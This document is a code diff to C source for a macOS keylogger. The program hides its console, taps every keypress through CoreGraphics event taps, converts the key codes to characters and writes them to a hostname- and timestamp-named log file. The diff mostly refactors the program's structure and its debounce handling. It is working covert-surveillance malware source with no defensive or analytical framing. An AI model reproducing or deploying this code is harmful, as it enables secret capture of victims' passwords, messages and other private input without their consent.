@@ -6,8 +6,6 @@
 #include <time.h>
 #include <Carbon/Carbon.h>
 
-#include "util.h"
-
 #define DEBOUNCE_DELAY 0.025 // Adjust as needed (in seconds)
 
 void hideConsole() {
@@ -17,8 +15,8 @@ void hideConsole() {
     }
 }
 
-FILE *logfile;
-
+FILE* logFile;
+char logName[300];
 
 CGKeyCode previousKeyCode = 0;
 time_t previousKeyTime = 0;
@@ -26,14 +24,13 @@ time_t previousKeyTime = 0;
 // Structure to track key state and debounce time
 struct KeyState {
     bool down;
-    bool lastState; // Added field to track the previous state
     time_t lastEventTime;
 };
 
 // Map key codes to debounce state
 struct KeyState keyStates[256] = {0};
 
-const char *convertKeyCode(int keyCode, bool shift, bool caps) {
+const char* convertKeyCode(int keyCode, bool shift, bool caps) {
     switch ((int) keyCode) {
         case 0:   return shift || caps ? "A" : "a";
         case 1:   return shift || caps ? "S" : "s";
@@ -152,75 +149,99 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
     return "[unknown]";
 }
 
-
-
-
-bool isModifierKey(CGKeyCode keyCode) {
-    return (keyCode == kVK_Shift || keyCode == kVK_RightShift ||
-            keyCode == kVK_Control || keyCode == kVK_RightControl ||
-            keyCode == kVK_Command || keyCode == kVK_RightCommand ||
-            keyCode == kVK_Option || keyCode == kVK_RightOption ||
-            keyCode == kVK_CapsLock);
+char* getHostName() {
+    static char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == 0) {
+        return hostname;
+    } else {
+        perror("gethostname");
+        return NULL;
+    }
 }
 
-// The following callback method is invoked on every keypress.
-CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if (type != kCGEventKeyDown && type != kCGEventKeyUp) {
+int createLog(FILE** logFile, char* logName) {
+    char* hostname = getHostName();
+    if (hostname == NULL) {
+        fprintf(stderr, "Error: Unable to get hostname.\n");
+        return 1;
+    }
+    // Generate filename with hostname, date, and time
+    time_t rawtime;
+    struct tm* timeinfo;
+    char timeBuffer[80];
+
+    time(&rawtime);
+    timeinfo = localtime(&rawtime);
+    strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d_%H-%M-%S", timeinfo);
+
+    snprintf(logName, 300, "%s_%s.txt", hostname, timeBuffer);
+
+    *logFile = fopen(logName, "a");
+    if (*logFile == NULL) {
+        perror("fopen");
+        return 1;
+    }
+    return 0;
+}
+
+CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
+    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
         return event;
     }
 
-    CGEventFlags flags = CGEventGetFlags(event);
-    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+    bool keyDown = (type == kCGEventKeyDown);
+    time_t currentTime = time(NULL);
 
-    // Check if the key event is a key up event
-    bool keyUpEvent = (type == kCGEventKeyUp);
-
-    // Update key state
-    keyStates[keyCode].down = !keyUpEvent;
-
-    // Print the human-readable key to the logfile if it's not a modifier key and it was just pressed
-    if (!isModifierKey(keyCode) && keyStates[keyCode].down && keyCode != previousKeyCode) {
-        bool shift = flags & kCGEventFlagMaskShift;
-        bool caps = flags & kCGEventFlagMaskAlphaShift;
-
-        // Handle Caps Lock
-        if ((keyCode == kVK_CapsLock) && (flags & kCGEventFlagMaskAlphaShift)) {
-            caps = !caps; // Toggle caps if Caps Lock is pressed
+    // Debounce handling
+    if (keyStates[keyCode].down != keyDown) {
+        double debounceTime = difftime(currentTime, keyStates[keyCode].lastEventTime);
+        if (debounceTime < DEBOUNCE_DELAY) {
+            return event;
         }
-
-        fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
-        fflush(logfile);
-
-        // Update previous key code
-        previousKeyCode = keyCode;
+        keyStates[keyCode].down = keyDown;
+        keyStates[keyCode].lastEventTime = currentTime;
     }
+
+    bool shiftPressed = (CGEventGetFlags(event) & kCGEventFlagMaskShift) != 0;
+    bool capsLockOn = (CGEventGetFlags(event) & kCGEventFlagMaskAlphaShift) != 0;
+
+    const char* keyString = convertKeyCode(keyCode, shiftPressed, capsLockOn);
+
+    if (keyDown) {
+        fprintf(logFile, "%s", keyString);
+        fflush(logFile);
+    }
+
+    previousKeyCode = keyCode;
+    previousKeyTime = currentTime;
 
     return event;
 }
 
-
-int script_macos() {
+int main() {
     hideConsole();
 
     // Reset previousKeyCode at the beginning of each keylogging session
     previousKeyCode = 0;
 
-    if(createLog(logfile) == 1)return 1;
+    if (createLog(&logFile, logName) != 0) {
+        return 1;
+    }
 
-
-    if (!logfile) {
+    if (logFile == NULL) {
         fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
         return 2;
     }
 
     CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
     CFMachPortRef eventTap = CGEventTapCreate(
-            kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
+        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
     );
 
     if (!eventTap) {
         fprintf(stderr, "ERROR: Unable to create event tap.\n");
-        fclose(logfile);
+        fclose(logFile);
         return 10;
     }
 
@@ -228,11 +249,11 @@ int script_macos() {
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
-    fprintf(logfile , "\n\nKeylogging has begun.\n");
-    fflush(logfile);
+    fprintf(logFile, "\n\nKeylogging has begun.\n");
+    fflush(logFile);
     fflush(stdout);
     CFRunLoopRun();
 
-    fclose(logfile);
+    fclose(logFile);
     return 0;
 }
